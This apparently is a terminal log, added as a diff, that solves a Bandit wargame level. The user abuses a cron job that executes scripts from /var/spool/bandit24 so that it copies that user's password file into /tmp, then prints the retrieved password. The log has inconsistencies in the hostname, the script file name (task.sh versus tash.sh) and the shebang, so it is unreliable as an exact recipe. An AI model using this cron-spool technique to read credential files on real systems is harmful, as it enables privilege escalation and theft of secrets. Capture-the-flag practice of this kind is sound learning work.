@@ -1,0 +1,37 @@
+bandit23@bandit:/var/spool$ cd /etc/cron.d
+bandit23@bandit:/etc/cron.d$ ls
+cronjob_bandit22  cronjob_bandit23  cronjob_bandit24
+bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
+@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+
+
+
+#!bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname
+echo "Executing and deleting all scripts in /var/spool/$myname:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        timeout -s 9 60 ./$i
+        rm -f ./$i
+    fi
+done
+
+bandit23@melinda:/etc/cron.d$ cd /tmp
+bandit23@melinda:/tmp$ vim task.sh
+bandit23@melinda:/tmp$ cat tash.sh
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/ans
+bandit23@melinda:/tmp$ ls -l tash.sh
+-rw-rw-r-- 1 bandit23 bandit23 53 May 12 22:00 tash.sh
+bandit23@melinda:/tmp$ chmod 777 tash.sh
+bandit23@melinda:/tmp$ cp tash.sh /var/spool/bandit24/
+(afer a while ...)
+bandit23@melinda:/tmp$ cat ans
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
